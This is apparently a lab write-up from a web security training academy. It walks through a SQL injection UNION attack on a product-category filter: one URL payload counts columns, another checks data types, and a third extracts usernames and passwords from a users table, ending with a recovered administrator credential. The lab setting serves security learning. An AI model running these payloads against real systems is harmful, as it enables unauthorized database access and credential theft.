##SQL injection UNION attack, retrieving data from other tables 
 
 1. main url: product category==>
https://0acf000003b3219d83104b1700fd00d4.web-security-academy.net/filter?category=Gifts

2. find the number of columns in the original query by using the UNION operator with a different number of columns in each SELECT statement, for example:

https://0acf000003b3219d83104b1700fd00d4.web-security-academy.net/filter?category=Gifts' union select null,null-- 

3. find the data type of each column by using the UNION operator with different data types in each SELECT statement, for example:

https://0acf000003b3219d83104b1700fd00d4.web-security-academy.net/filter?category=Gifts' union select 'asbn','gfgxv'-- 

4. retrieve data from other tables, for example, to retrieve the username and password from the users table, you can use the following query: 

https://0acf000003b3219d83104b1700fd00d4.web-security-academy.net/filter?category=Gifts'union select username, password from users-- 

username = administrator
password = q3a3mff5dtye1mj9e92w